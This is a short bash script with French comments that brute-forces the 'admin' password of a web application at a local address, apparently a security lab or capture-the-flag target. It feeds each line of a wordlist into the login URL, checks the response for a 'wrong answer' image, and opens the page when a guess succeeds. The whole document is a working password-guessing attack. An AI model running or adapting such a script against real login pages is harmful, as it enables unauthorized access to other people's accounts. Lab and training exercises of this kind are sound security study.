#!/bin/bash


# Récupère le code HTML de la page de recherche

while read ligne
do
    url="http://192.168.64.3/?page=signin&username=admin&password=$ligne&Login=Login#"
    
    if curl -s "$url" | grep -q "images/WrongAnswer.gif"
    then
        echo "wrong password : $ligne"
    else
        echo "find password : $ligne"
        open $url
        exit 1
fi
done < mdp.txt


